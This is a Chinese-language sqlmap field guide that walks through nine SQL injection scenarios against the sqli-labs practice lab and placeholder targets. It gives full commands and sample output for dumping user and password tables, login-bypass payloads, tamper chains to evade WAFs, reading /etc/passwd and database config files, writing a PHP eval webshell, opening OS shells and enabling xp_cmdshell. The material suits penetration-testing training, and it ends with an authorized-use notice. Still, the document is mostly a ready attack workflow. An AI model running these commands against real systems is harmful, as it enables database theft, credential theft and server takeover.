# sqlmap 实战使用场景示例

> 本文整理了 sqlmap 在不同场景下的实战使用案例和完整操作流程。

---

## 场景一：基础 SQL 注入检测与数据获取

### 目标
发现并利用 GET 参数的 SQL 注入漏洞，获取数据库中的用户数据。

### 操作流程

**步骤一：检测注入点**
```bash
# 1. 基础检测
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" --batch

# 输出分析：
# [*] testing connection to the target URL
# [*] checking if the target is protected by WAF/IPS/IDS
# [+] GET parameter 'id' is vulnerable
#     Type: boolean-based blind
#     Type: UNION query
#     ...

# 2. 如果没检测到，提高 level/risk
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" \
       --level=3 --risk=2 --batch
```

**步骤二：获取数据库信息**
```bash
# 1. 获取数据库版本和 banner
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" -b --batch

# 2. 获取当前数据库名
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" --current-db --batch
# 输出：current database: 'security'

# 3. 获取当前用户
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" --current-user --batch

# 4. 检查是否 DBA
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" --is-dba --batch

# 5. 获取所有数据库
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" --dbs --batch
# 输出：
# available databases [5]:
# [*] information_schema
# [*] challenges
# [*] mysql
# [*] performance_schema
# [*] security
```

**步骤三：枚举表和列**
```bash
# 1. 获取 security 库的所有表
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" \
       -D security --tables --batch
# 输出：
# Database: security
# [4 tables]
# +----------+
# | emails   |
# | referers |
# | uagents  |
# | users    |
# +----------+

# 2. 获取 users 表的所有列
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" \
       -D security -T users --columns --batch
# 输出：
# Database: security
# Table: users
# [3 columns]
# +----------+-------------+
# | Column   | Type        |
# +----------+-------------+
# | id       | int(3)      |
# | password | varchar(20) |
# | username | varchar(20) |
# +----------+-------------+
```

**步骤四：导出数据**
```bash
# 1. 导出 users 表所有数据
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" \
       -D security -T users --dump --batch

# 输出：
# Database: security
# Table: users
# [13 entries]
# +----+------------+----------+
# | id | password   | username |
# +----+------------+----------+
# | 1  | Dumb       | Dumb     |
# | 2  | I-kill-you | Angelina |
# | 3  | p@ssword   | Dummy    |
# | ...           | ...      |
# +----+------------+----------+

# 2. 只导出指定列
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" \
       -D security -T users -C username,password --dump --batch

# 3. 导出整个数据库
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" \
       -D security --dump --batch
```

## 场景二：POST 登录注入

### 目标
通过登录表单的 POST 参数进行 SQL 注入，获取管理员账号。

### 操作流程

**步骤一：获取请求文件**
```
1. 用 Burp 拦截登录请求
2. 右键 → Copy to file
3. 保存为 login_request.txt

请求内容示例：
POST /sqli-labs/Less-11/ HTTP/1.1
Host: 192.168.1.100
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

uname=admin&passwd=123&submit=Submit
```

**步骤二：检测注入**
```bash
# 从请求文件检测
sqlmap -r login_request.txt --batch

# 指定测试参数
sqlmap -r login_request.txt -p uname --batch

# 或直接用命令行
sqlmap -u "http://192.168.1.100/sqli-labs/Less-11/" \
       --data="uname=admin&passwd=123&submit=Submit" \
       --batch
```

**步骤三：获取数据**
```bash
# 获取所有数据库
sqlmap -r login_request.txt -p uname --dbs --batch

# 获取用户表数据
sqlmap -r login_request.txt -p uname \
       -D security -T users --dump --batch

# 查找管理员账户
sqlmap -r login_request.txt -p uname \
       -D security --search -C admin --batch
```

**步骤四：万能密码登录**
```bash
# 检测到注入后，直接用万能密码测试
# 在登录框输入：
用户名：admin' -- 
密码：任意

# 或：
用户名：' OR '1'='1
密码：' OR '1'='1

# 原理：构造永真条件，绕过密码验证
```

## 场景三：Cookie 注入

### 目标
通过 Cookie 参数进行 SQL 注入。

### 操作流程

**步骤一：检测 Cookie 注入**
```bash
# 方法一：使用 --cookie 参数
sqlmap -u "http://target.com/page.php" \
       --cookie="id=1" \
       --level=2 \
       --batch

# 说明：
# level 2 及以上才会测试 Cookie 参数
# 默认 level 1 只测试 GET/POST 参数
```

**步骤二：深入利用**
```bash
# 获取数据库
sqlmap -u "http://target.com/page.php" \
       --cookie="id=1" \
       --level=2 \
       --dbs --batch

# 导出数据
sqlmap -u "http://target.com/page.php" \
       --cookie="id=1" \
       --level=2 \
       -D dbname -T users --dump --batch
```

**步骤三：Cookie 中标记注入点**
```bash
# 使用 * 标记注入点
sqlmap -u "http://target.com/" \
       --cookie="session=abc123; user_id=1*" \
       --level=2 --batch
```

## 场景四：WAF 绕过注入

### 目标
目标网站有 WAF 防护，需要绕过 WAF 进行 SQL 注入。

### 操作流程

**步骤一：检测 WAF**
```bash
# 检测是否有 WAF
sqlmap -u "http://target.com/page?id=1" --check-waf

# 输出示例：
# [*] testing connection to the target URL
# [*] checking if the target is protected by WAF/IPS/IDS
# [*] heuristics detected that the target is protected by some kind of WAF/IPS
# [*] WAF/IPS identified: 'Cloudflare (Cloudflare Inc.)'
```

**步骤二：尝试基础绕过**
```bash
# 组合一：空格注释 + 随机大小写
sqlmap -u "http://target.com/page?id=1" \
       --tamper=space2comment,randomcase \
       --random-agent \
       --batch

# 组合二：URL 编码 + 随机大小写
sqlmap -u "http://target.com/page?id=1" \
       --tamper=charencode,randomcase \
       --random-agent \
       --batch
```

**步骤三：中级绕过**
```bash
# 组合三：多重 tamper
sqlmap -u "http://target.com/page?id=1" \
       --tamper=space2comment,randomcase,charencode,between,greatest \
       --random-agent \
       --delay=0.5 \
       --batch

# 组合四：Unicode 编码
sqlmap -u "http://target.com/page?id=1" \
       --tamper=charunicodeencode,space2comment,randomcase \
       --random-agent \
       --batch
```

**步骤四：高级绕过**
```bash
# 组合五：最强组合（慢速 + 多 tamper）
sqlmap -u "http://target.com/page?id=1" \
       --tamper=space2comment,randomcase,charencode,charunicodeencode,between,greatest,percentage \
       --random-agent \
       --delay=1 \
       --timeout=30 \
       --retries=3 \
       --threads=1 \
       --batch

# 组合六：使用代理池
sqlmap -u "http://target.com/page?id=1" \
       --proxy=http://127.0.0.1:8080 \
       --tamper=space2comment,randomcase \
       --delay=2 \
       --batch
```

**步骤五：HTTP 参数污染（HPP）**
```bash
# 使用 --hpp 参数
sqlmap -u "http://target.com/page?id=1" --hpp --batch

# 原理：
# 某些 WAF 只检查第一个同名参数
# 而后端使用第二个参数的值
# 构造：?id=1&id=1' UNION SELECT...
```

## 场景五：时间盲注数据获取

### 目标
只有时间盲注可用时，高效地获取数据库数据。

### 操作流程

**步骤一：确认时间盲注**
```bash
# 检测注入类型
sqlmap -u "http://target.com/search?q=test" --batch

# 如果只有时间盲注（Type: Time-based blind）
# 继续后续步骤
```

**步骤二：优化时间盲注速度**
```bash
# 方法一：减少延迟时间（默认 5 秒）
sqlmap -u "http://target.com/search?q=test" \
       --technique=T \
       --time-sec=2 \
       --batch

# 方法二：增加线程
sqlmap -u "http://target.com/search?q=test" \
       --technique=T \
       --threads=10 \
       --batch

# 方法三：只导出关键表，不导全部
sqlmap -u "http://target.com/search?q=test" \
       --technique=T \
       -D dbname -T users -C username,password \
       --dump --batch
```

**步骤三：加速数据获取**
```bash
# 使用二分法（sqlmap 自动使用）
# 时间盲注使用二分法逐位猜解
# 每字节需要约 log2(128) = 7 次请求

# 减少获取的数据量
sqlmap -u "http://target.com/search?q=test" \
       --technique=T \
       -D dbname -T users \
       --start=1 --stop=10 \
       --dump --batch

# 只获取前 10 条数据
```

## 场景六：文件读取与 WebShell 写入

### 目标
通过 SQL 注入读取服务器敏感文件，并写入 WebShell 获取服务器权限。

### 操作流程

**步骤一：读取敏感文件**
```bash
# 1. 读取 /etc/passwd（Linux）
sqlmap -u "http://target.com/page?id=1" \
       --file-read="/etc/passwd" --batch

# 输出：
# [*] the file '/etc/passwd' has been saved as:
# [*] /home/user/.local/share/sqlmap/output/target.com/files/_etc_passwd

# 2. 读取 win.ini（Windows）
sqlmap -u "http://target.com/page?id=1" \
       --file-read="C:\\windows\\win.ini" --batch

# 3. 读取网站配置文件
sqlmap -u "http://target.com/page?id=1" \
       --file-read="/var/www/html/config.php" --batch

# 4. 读取数据库配置（找数据库密码）
sqlmap -u "http://target.com/page?id=1" \
       --file-read="/var/www/html/includes/db_config.php" --batch
```

**步骤二：写入 WebShell**
```bash
# 1. 准备 WebShell 文件（本地）
# shell.php 内容：
# <?php @eval($_POST['cmd']); ?>

# 2. 写入 WebShell
sqlmap -u "http://target.com/page?id=1" \
       --file-write="./shell.php" \
       --file-dest="/var/www/html/shell.php" \
       --batch

# 3. 验证 WebShell
# 访问 http://target.com/shell.php
# POST 参数 cmd=phpinfo(); 测试
```

**步骤三：获取 OS Shell**
```bash
# 方法一：使用 --os-shell
sqlmap -u "http://target.com/page?id=1" --os-shell
# 进入交互式 shell
# 可以执行系统命令

# 方法二：执行单条命令
sqlmap -u "http://target.com/page?id=1" --os-cmd="whoami" --batch
sqlmap -u "http://target.com/page?id=1" --os-cmd="id" --batch
sqlmap -u "http://target.com/page?id=1" --os-cmd="net user" --batch
```

**步骤四：提权（MSSQL 为例）**
```bash
# MSSQL 使用 xp_cmdshell
sqlmap -u "http://target.com/page?id=1" \
       --dbms=mssql \
       --os-shell \
       --batch

# 原理：
# MSSQL 的 xp_cmdshell 存储过程可以执行系统命令
# 如果是 DBA 权限，通常可以直接执行
```

## 场景七：伪静态 URL 注入

### 目标
对伪静态（URL 重写）的页面进行 SQL 注入测试。

### 操作流程

**步骤一：识别伪静态 URL**
```
伪静态 URL 特征：
- 看起来像静态页面，如 /article/1.html
- 但实际参数在 URL 路径中
- 常见形式：
  /article/1.html       → article.php?id=1
  /news/2024/01/1.html  → news.php?year=2024&month=01&id=1
  /product/100/         → product.php?id=100
```

**步骤二：标记注入点**
```bash
# 使用 * 标记可能的注入点

# 单参数伪静态
sqlmap -u "http://target.com/article/1*.html" --batch

# 多参数伪静态
sqlmap -u "http://target.com/news/2024*/01*/1*.html" --batch

# RESTful API 风格
sqlmap -u "http://target.com/api/v1/users/1*" --batch
sqlmap -u "http://target.com/api/v1/users/1*/posts/2*" --batch

# 路径参数
sqlmap -u "http://target.com/product/100*/detail" --batch
```

**步骤三：检测与利用**
```bash
# 检测注入
sqlmap -u "http://target.com/article/1*.html" --batch

# 枚举数据
sqlmap -u "http://target.com/article/1*.html" --dbs --batch

# 导出数据
sqlmap -u "http://target.com/article/1*.html" \
       -D dbname -T tablename --dump --batch
```

## 场景八：二次注入

### 目标
检测和利用二次注入漏洞（数据存入数据库后，在其他页面触发注入）。

### 操作流程

**步骤一：理解二次注入原理**
```
二次注入流程：
1. 用户输入恶意数据（如注册用户名）
2. 数据被存入数据库（此时可能被转义）
3. 程序从数据库读取数据，直接拼接 SQL
4. 触发 SQL 注入

常见场景：
- 用户注册 → 个人信息展示
- 留言板 → 后台查看留言
- 订单提交 → 后台订单管理
```

**步骤二：检测二次注入**
```bash
# 使用 --second-url 参数
# 第一个 URL 注入数据，第二个 URL 查看结果

sqlmap -u "http://target.com/register.php" \
       --data="username=test&password=123&email=test@test.com" \
       --second-url="http://target.com/profile.php" \
       -p username \
       --batch

# 原理：
# 1. sqlmap 在 register.php 的 username 参数注入
# 2. 数据被存入数据库
# 3. sqlmap 访问 profile.php 检查注入结果
# 4. 根据 profile.php 的响应判断注入是否成功
```

**步骤三：实际操作流程**
```bash
# 1. 先找到输入点（注册、留言、提交等）
# 2. 找到数据展示点（个人中心、后台管理等）
# 3. 使用 --second-url 进行检测
# 4. 如果成功，继续枚举数据

# 示例：用户注册处二次注入
sqlmap -u "http://target.com/register" \
       --data="user=test*&pass=123" \
       --second-url="http://target.com/userinfo" \
       --level=3 --batch
```

## 场景九：堆叠注入利用

### 目标
利用堆叠注入（Stacked Queries）执行多条 SQL 语句。

### 操作流程

**步骤一：确认堆叠注入**
```bash
# 检测注入类型
sqlmap -u "http://target.com/page?id=1" --batch

# 如果 Type: Stacked queries
# 说明支持堆叠注入

# 或指定技术类型检测
sqlmap -u "http://target.com/page?id=1" --technique=S --batch
```

**步骤二：堆叠注入利用**
```bash
# MSSQL 堆叠注入最常见（支持多语句执行）

# 1. 获取 OS Shell
sqlmap -u "http://target.com/page?id=1" \
       --dbms=mssql \
       --technique=S \
       --os-shell \
       --batch

# 2. 直接执行命令
sqlmap -u "http://target.com/page?id=1" \
       --dbms=mssql \
       --technique=S \
       --os-cmd="whoami" \
       --batch

# 3. 开启 xp_cmdshell
# sqlmap 会自动尝试开启
# 但也可以手动执行：
# EXEC sp_configure 'show advanced options', 1;
# RECONFIGURE;
# EXEC sp_configure 'xp_cmdshell', 1;
# RECONFIGURE;
```

**步骤三：读写文件**
```bash
# 堆叠注入 + 文件操作
sqlmap -u "http://target.com/page?id=1" \
       --dbms=mssql \
       --technique=S \
       --file-read="C:\\windows\\win.ini" \
       --batch

sqlmap -u "http://target.com/page?id=1" \
       --dbms=mssql \
       --technique=S \
       --file-write="shell.asp" \
       --file-dest="C:\\inetpub\\wwwroot\\shell.asp" \
       --batch
```

## 实战技巧总结

### 1. 注入检测流程

```
第一步：快速检测（默认参数）
  sqlmap -u "URL" --batch
  ↓
第二步：如果没检测到，提高 level
  sqlmap -u "URL" --level=3 --risk=2 --batch
  ↓
第三步：还没检测到，检查是否有 WAF
  sqlmap -u "URL" --check-waf
  ↓
第四步：使用 tamper 绕过
  sqlmap -u "URL" --tamper=... --batch
  ↓
第五步：从请求文件检测（确保准确性）
  sqlmap -r request.txt --batch
```

### 2. 数据获取效率

```
优先顺序（从快到慢）：
  1. 联合查询注入（UNION）→ 最快
  2. 报错注入（Error-based）→ 较快
  3. 布尔盲注（Boolean）→ 较慢
  4. 时间盲注（Time-based）→ 最慢

优化技巧：
  - 指定 --technique 只使用最快的可用类型
  - 只 dump 关键表，不导全部
  - 增加 --threads 线程数
  - 先获取表名列名，再选择性导出
```

### 3. WAF 绕过策略

```
渐进式绕过（从简单到复杂）：
  1. --random-agent（随机 UA）
  2. --tamper=space2comment（空格替换）
  3. + randomcase（随机大小写）
  4. + charencode（URL 编码）
  5. + charunicodeencode（Unicode 编码）
  6. + between,greatest（比较符替换）
  7. + --delay（增加延迟）
  8. + 代理池
```

---

> **安全提示**：sqlmap 是强大的安全测试工具，仅可用于授权测试。未经授权使用 sqlmap 攻击他人系统属于违法行为。
